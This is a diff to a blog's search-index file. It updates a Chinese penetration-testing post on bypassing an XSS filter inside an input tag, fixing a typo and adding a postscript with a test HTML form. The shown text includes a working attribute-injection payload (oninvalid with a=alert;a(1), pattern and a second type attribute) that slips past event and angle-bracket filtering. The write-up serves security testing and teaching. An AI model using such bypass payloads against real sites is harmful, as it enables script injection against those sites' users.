@@ -2175,7 +2175,7 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
     <title>记一次XSS绕过</title>
     <url>/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在某次演练中，发现了一处XSS注入点，位于<code>input</code>标签内，但是它拦截了大部分事件且拦截尖括号，并且标签内用<code>disable</code>，导致无法利用，本文记录一下绕过过程。</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在某次演练中，发现了一处XSS注入点，位于<code>input</code>标签内，但是它拦截了大部分事件且拦截尖括号，并且标签内有<code>disable</code>，导致无法利用，本文记录一下绕过过程。</p>
 <a id="more"></a>
 
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先简单看一下参数输出点，可以看到是在input标签内<br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-17-50.png"></p>
@@ -2199,7 +2199,8 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xss&quot; oninvalid=a=alert;a(1) pattern=&quot;a&quot; type=&quot;submit&quot; a=</span><br></pre></td></tr></table></figure>
 <p><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-40-27.png"><br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-40-45.png"></p>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文通过实际案例介绍了3个xss绕过小技巧，如有更好的方法，请各位师傅不吝赐教。</p>
-]]></content>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>文章在t00ls发布后有师傅问道”input中 先是text然后submit 最后的input应该显示的还是text，图中的form中没有submit 最后是咋触发的…”，想了下这点确实没特地提出来，实际上xss插入的type即是text又是submit，保存以下代码为HTML可自行测试，在文本框中按回车即可触发。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">oninvalid</span>=<span class="string">a</span>=<span class="string">alert;a(1)</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">a</span>=<span class="string">&quot; disabled=&quot;</span><span class="attr">disabled</span>&quot; <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
